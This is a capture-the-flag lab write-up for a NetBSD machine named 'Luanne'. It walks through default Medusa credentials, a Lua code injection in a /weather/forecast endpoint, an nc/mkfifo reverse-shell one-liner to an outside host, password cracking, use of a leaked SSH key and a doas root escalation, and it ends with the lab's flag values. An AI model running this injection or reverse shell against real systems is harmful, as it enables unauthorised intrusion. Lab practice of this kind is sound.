# luanne

# services

* 22 - ssh OpenBSD
* 80 - http nginx
* 9001 - httpd medusa 1.12

# http

Both of the http servers require authentication to access and admin/admin types are failing. 
**robots.txt** does give us a hint that /weather is working on port 80 despite it returning 400.

After looking up default creds for the only type of info we've been able to gather **medusa default creds**, we see an example of defualt creds in the official docs. 
**user:123**

The application is an interface for a process supervisor with limitied functionality.
    * view running processes
    * view memory
    * view uptime

Running processes gives us some information as to what is currently running on the server and we see that another httpd is currrenlty listening on port 3000 and its listed as WEATHER
``
/usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3001 -L weather /home/r.michaels/devel/webapi/weather.lua -P /var/run/httpd_devel.pid -U r.michaels -b /home/r.michaels/devel/www
``

This must be reachable at /weather on port 80.

# fuzzing /weather

robots.txt disclosed that /weather was listening despite returning 400, so we run gobuster and find **forecast**, which responds with information about paramters to provide. **"No city specified. Use 'city=list' to list available cities."** This parameter allows us to view the forecast for a provided city.

Now to fuzz this endpoint with hopes of injecting native code.

Fuzzing with /usr/share/wordlists/SecList/Fuzzing/special-chars.txt, returns a different response for '. We know this is endpoint is ran on lua, so the comment is --.
With '-- we still aren't able to get normal performance from the request, so we FUZZ again, between the single quote and comment:

``$ ffuf -u http://10.129.121.240/weather/forecast?city=\'FUZZ-- -w /usr/share/wordlists/SecList/Fuzzing/special-chars.txt``

This returns ')', which makes sense because our input is likely being passed to a function like forecast('input')
Now we use the syntax in lua to run bash commands.

``GET /weather/forecast?city=')os.execute("echo+hi")--`` returns a reflected response 'hi'

Now that we have rce, we can send a reverse shell with sh.

Found a nc reverse shell for OpenBSD:
```bash
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
```
*inject this into os.execute() and we receive a reverse shell*

get a stable shell with python3.7

There is a .htpasswd file in the first directory that we drop into and it can be cracked for cred:

**webapi_user:iamthebest**

## running processes

Taking a look at the current running processes on the box reveal that port 3001 is listening with httpd and has listed home/r.michaels/devel/www as the home dir
``r.michaels   569  0.0  0.0  34996  1976 ?     Is   12:42AM  0:00.00 /usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3001 -L weather /home/r.michaels/devel/webapi/weather.lua -P /var/run/httpd_devel.pid -U r.michaels -b /home/r.michaels/devel/www``

This httpd server is reachable from the local machine, so we are going to use curl to send requests to the server and try to extract info.

```bash
curl --user "webapi_usr:iamthebest" 127.0.0.1:3001/~r.michaels/
```
*this request returns the contents of r.michaels home directory and there is a private key inside*

We use the priv key to connect via ssh with r.michaels to the machine.

## PE

Inside of r.michaels home directory is a backup directory with an encrypted backup .tar.gz.enc of the devel directory. There is also a .gnupg directory in r.michaels home directory that contains a public/private gpg key pair. The backup directory was likely encrypted with the gpg public key.

Researching how NetBSD encrypts/decrypts files, we see that it uses netpgp, so we use this command and we are able to decrypt the backup, which then needs to be decompressed and untar'd. 
```bash
netpgp --decrypt devel_backup-2020-09-16.tar.gz.enc --output=/tmp/devel_backup-2020-09-16.tar.gz                                                                                                                                    
signature  2048/RSA (Encrypt or Sign) 3684eb1e5ded454a 2020-09-14                                                                                                                                                                           
Key fingerprint: 027a 3243 0691 2e46 0c29 9f46 3684 eb1e 5ded 454a                                                                                                                                                                          
uid              RSA 2048-bit key <r.michaels@localhost> 
```

Viewing the contents of the backup devel/ the only difference is the .htpasswd file, so we use hashcat again like earlier to crack the creds
creds found:
**r.michaels:littlebear**


All thats left is to use doas with the recovered password and we can execute /bin/sh to become root.

user flag: ea5f0ce6a917b0be1eabc7f9218febc0
root flag: 7a9b5c206e8e8ba09bb99bd113675f66
